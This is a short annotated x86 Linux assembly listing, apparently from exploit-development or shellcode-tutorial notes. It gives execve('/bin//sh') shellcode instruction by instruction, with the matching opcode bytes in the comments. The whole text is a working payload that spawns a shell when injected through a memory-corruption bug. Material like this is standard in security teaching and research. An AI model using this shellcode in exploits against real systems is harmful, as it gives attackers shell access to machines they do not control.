sub esp,0x50		; \x83\xec\x50 (change the stack pointer's position)
xor edx,edx			; \x31\xd2 (set that there is no 3rd arg)
push edx			; \x52     (push null byte onto stack as string terminator)
xor ecx,ecx			; \x31\xc9 (set that there is no 2nd arg)
push '//sh'			; \x68\x2f\x2f\x73\x68 (push "/bin//sh")
push '/bin'			; \x68\x2f\x62\x69\x6e
mov ebx,esp			; \x89\xe3 (set ebx, the 1st arg, with "/bin//sh\0")
push 0x0b			; \x6a\x0b
pop eax				; \x58     (set to use sys_execve)
int 0x80			; \xcd\x80